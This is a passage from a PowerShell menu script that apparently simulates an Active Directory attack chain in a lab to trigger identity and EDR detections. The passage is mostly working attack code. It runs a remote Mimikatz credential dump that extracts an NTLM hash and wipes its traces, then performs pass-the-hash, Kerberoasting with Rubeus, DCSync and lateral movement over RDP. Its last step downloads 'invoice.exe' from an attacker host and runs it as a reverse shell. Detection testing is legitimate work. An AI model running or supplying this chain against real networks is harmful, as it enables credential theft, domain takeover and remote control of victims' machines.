`$matches3 = `$regex2.Matches(`$content)
foreach (`$m in `$matches3) {
    `$u = `$m.Groups[1].Value
    `$h = `$m.Groups[2].Value
    if (`$u -notmatch '\`$') {
        `$highlight = if (`$u -match "svc_runbook") { "Green" } else { "Gray" }
        Write-Host "    `$u : `$h" -ForegroundColor `$highlight
    }
}

# Extract svc_runbook hash specifically
if (`$content -match "svc_runbook[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
    `$svcHash = `$Matches[1].ToLower()
    `$svcHash | Out-File -FilePath "`$idpDir\svc_runbook_hash.txt" -Encoding ASCII
    Write-Host ""
    Write-Host "  [+] svc_runbook NTLM FOUND: `$svcHash" -ForegroundColor Green
    Write-Host "  [+] Hash saved to `$idpDir\svc_runbook_hash.txt" -ForegroundColor Green
    Write-Host "  [+] Steps 7, 8, 9 will use it automatically." -ForegroundColor Green
} else {
    Write-Host ""
    Write-Host "  [-] svc_runbook not found in dump." -ForegroundColor Yellow
    Write-Host "  [*] svc_runbook may not be logged on DT. Try RDP'ing first (Step 5)." -ForegroundColor Gray
    Write-Host "  [*] Or enter the hash manually below." -ForegroundColor Gray
}

# --- Cleanup remote artifacts ---
Write-Host ""
Write-Host "  [*] Cleaning up remote artifacts on DT ..." -ForegroundColor Gray
Remove-Item `$remoteMimi -Force -ErrorAction SilentlyContinue
Remove-Item `$remoteBat -Force -ErrorAction SilentlyContinue
Remove-Item `$remoteDump -Force -ErrorAction SilentlyContinue
Write-Host "  [+] Cleanup done." -ForegroundColor Green

Write-Host ""
Write-Host "Press any key to close..." -ForegroundColor Gray
`$null = `$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
"@
            $remoteDumpScript | Out-File -FilePath "$idpDir\remote_dump_dt.ps1" -Encoding ASCII

            # Batch wrapper for PtH context
            '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\remote_dump_dt.ps1' | Out-File -FilePath "$idpDir\run_remote_dump_dt.bat" -Encoding ASCII

            Write-Host "  [*] Launching PtH clark.monroe -> remote dump on DT..." -ForegroundColor White
            Write-Host "  [*] A new window will open showing the remote dump progress." -ForegroundColor Gray
            Write-Host

            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_remote_dump_dt.bat" "exit"

            Write-Host
            Write-Host "[+] Remote dump launched in PtH context." -ForegroundColor Green
            Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
            Write-Host "[*] If svc_runbook hash is found, it will be saved automatically." -ForegroundColor Cyan
            Write-Host
            Write-Host "[*] If auto-extraction fails, enter manually:" -ForegroundColor Gray
            $manualSvc = Read-Host "  svc_runbook NTLM (or Enter to skip)"
            if ($manualSvc -and $manualSvc.Length -eq 32) {
                $manualSvc | Out-File -FilePath $svcHashFile -Encoding ASCII
                Write-Host "[+] Hash saved manually." -ForegroundColor Green
            }
        }

        '7' {
            Clear-Host
            Write-Host "[Step 7] Kerberoasting - svc_runbook (SPN: web/svc_runbook)" -ForegroundColor Cyan
            Write-Host "         Requesting TGS via PtH context..." -ForegroundColor Gray
            Write-Host "         Triggers: Kerberoasting detection" -ForegroundColor Yellow
            Write-Host

            $clarkHash = Get-ClarkHash
            if (-not $clarkHash) { break }

            if (Test-Path "$idpDir\Rubeus.exe") {
                # Rubeus supports /rc4: for hash-based auth
                Write-Host "  Using Rubeus with clark.monroe hash..." -ForegroundColor White
                & "$idpDir\Rubeus.exe" kerberoast /user:svc_runbook /domain:$env:ENV_DOMAIN /dc:$env:ENV_DC_IP /rc4:$clarkHash /outfile:"$idpDir\kerberoast_hashes.txt"
                Write-Host "`n[+] TGS hash saved to: $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
            }
            else {
                # Fallback: PtH -> spawn mimikatz kerberos::ask
                Write-Host "  Rubeus not found. Using mimikatz PtH -> kerberos::ask..." -ForegroundColor Yellow
                "$mimiExe `"privilege::debug`" `"kerberos::ask /target:web/svc_runbook`" `"exit`"" | Out-File -FilePath "$idpDir\run_kerberoast.bat" -Encoding ASCII
                & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_kerberoast.bat" "exit"
            }
        }

        '8' {
            Clear-Host
            Write-Host "[Step 8] PtH svc_runbook -> DCSync" -ForegroundColor Cyan
            Write-Host "         Using svc_runbook NTLM hash for Pass-the-Hash..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash, StaleAccount, DCSync" -ForegroundColor Yellow
            Write-Host

            $svcHash = Get-SvcRunbookHash
            if (-not $svcHash) {
                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
            }

            if (-not $svcHash -or $svcHash.Length -ne 32) {
                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
            } else {
                Write-Host "  User:   svc_runbook" -ForegroundColor White
                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
                Write-Host

                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:c:\IDP_Files\Post_PtH_DCSync.bat`""

                Write-Host "[+] PtH launched - DCSync should execute in new window." -ForegroundColor Green
            }
        }

        '9' {
            Clear-Host
            Write-Host "[Step 9] PtH svc_runbook -> RDP to BL" -ForegroundColor Cyan
            Write-Host "         Lateral movement to managed host (Falcon EDR)..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash (Identity) + lateral movement (EDR on BL)" -ForegroundColor Yellow
            Write-Host

            $svcHash = Get-SvcRunbookHash
            if (-not $svcHash) {
                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
            }

            if (-not $svcHash -or $svcHash.Length -ne 32) {
                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
            } else {
                Write-Host "  User:   svc_runbook" -ForegroundColor White
                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
                Write-Host "  Target: $env:ENV_BL (BL)" -ForegroundColor White
                Write-Host

                # Create batch launcher for RDP
                "mstsc /v:$env:ENV_BL" | Out-File -FilePath "$idpDir\run_rdp_bl.bat" -Encoding ASCII

                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:$idpDir\run_rdp_bl.bat`""

                Write-Host "[+] PtH launched - RDP window should open to BL." -ForegroundColor Green
            }
        }

        '0' {
            Clear-Host
            Write-Host "[Step 0] Download & execute reverse shell" -ForegroundColor Cyan
            Write-Host "         Make sure listener is running on attacker host first!" -ForegroundColor Yellow
            Write-Host

            Invoke-WebRequest -Uri "http://attacker.lab.local/invoice.exe" -OutFile "$idpDir\invoice.exe" -UseBasicParsing
            & "$idpDir\invoice.exe"
        }

        'q' { return }
    }
    pause
}
until ($selection -eq 'q')
